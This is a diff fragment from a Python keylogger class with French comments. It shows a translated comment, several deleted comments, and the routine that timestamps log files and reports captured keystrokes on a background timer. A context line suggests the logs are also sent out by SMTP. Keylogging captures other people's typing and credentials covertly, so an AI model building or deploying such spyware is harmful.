@@ -85,7 +85,7 @@ class Keylogger: #classe pour le keylogger pour pouvoir l'instancier
         server.quit() #fermeture de la connexion au serveur smtp
 
     def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
+        # créer les fichiers idendifiés par la date et l'heure
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
@@ -106,23 +106,22 @@ class Keylogger: #classe pour le keylogger pour pouvoir l'instancier
         It basically sends keylogs and resets `self.log` variable
         """
         if self.log:
-            # if there is something in log, report it
+            
             self.end_dt = datetime.now()
-            # update `self.filename`
             self.update_filename()
             
             self.report_to_file()
-            # if you don't want to print in the console, comment below line
+            
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = threading.Timer(interval=self.interval, function=self.report2)
-        # set the thread as daemon (dies when main thread die)
+        
         timer.daemon = True
-        # start the timer
+        
         timer.start()
 
-    #create a new file for each new session
+    
     
     
     
